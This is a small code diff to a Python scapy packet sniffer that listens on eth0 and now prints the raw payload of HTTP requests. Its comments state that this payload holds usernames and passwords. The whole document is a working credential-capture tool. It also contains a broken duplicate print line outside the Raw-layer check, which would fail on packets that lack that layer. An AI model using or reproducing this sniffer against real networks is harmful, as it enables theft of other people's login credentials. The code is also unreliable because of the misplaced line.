@@ -8,6 +8,8 @@ def sniff(interface):
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-       print(packet)
+       if packet.haslayer(scapy.Raw):  #Raw is the layer that contains username and password
+          print(packet[scapy.Raw].load)  #load is the field that contains username and password
+       print(packet[scapy.Raw].load)
 
 sniff("eth0") 
